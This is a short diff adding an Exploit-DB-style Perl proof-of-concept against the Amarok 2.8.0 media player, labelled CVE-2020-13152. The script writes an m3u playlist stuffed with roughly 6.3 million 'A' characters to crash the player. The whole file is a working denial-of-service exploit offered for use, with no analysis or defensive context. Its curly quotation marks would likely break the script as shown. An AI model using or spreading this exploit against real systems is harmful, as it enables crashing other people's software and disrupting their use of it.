@@ -1,0 +1,15 @@
+# Exploit Title: Amarok 2.8.0 - Denial-of-Service
+# Date: 1 November 2020
+# Exploit Author: FishballAndMeatball
+# Vendor Homepage: https://amarok.kde.org/
+# Software link: https://community.kde.org/Amarok/GettingStarted/Download
+# Version: Amarok 2.8.0
+# Tested on: Windows 10, Windows 7, Windows XP
+# CVE: CVE-2020-13152
+
+my $file= “test_big.m3u“;
+my $junk= “\x41” x 6368545;
+open($FILE,”>$file”);
+print $FILE “$junk”;
+close($FILE);
+print “m3u File Created successfully\n”;
